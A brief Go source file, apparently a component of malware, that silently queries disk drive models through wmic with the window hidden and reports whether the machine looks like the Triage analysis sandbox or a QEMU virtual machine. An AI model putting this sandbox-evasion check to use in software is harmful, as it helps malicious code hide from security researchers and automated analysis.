package TriageDetection

import (
	"log"
	"os/exec"
	"strings"
	"syscall"
)

// TriageCheck checks for specific hard disk models and returns true if found.
func TriageCheck() (bool, error) {
	monki := exec.Command("wmic", "diskdrive", "get", "model")

	// Set the command to hide the console window
	monki.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}

	wowww, err := monki.Output()
	if err != nil {
		log.Printf("Error running wmic command: %v", err)
		return false, err
	}

	if strings.Contains(string(wowww), "DADY HARDDISK") || strings.Contains(string(wowww), "QEMU HARDDISK") {
		return true, nil
	}

	return false, nil
}
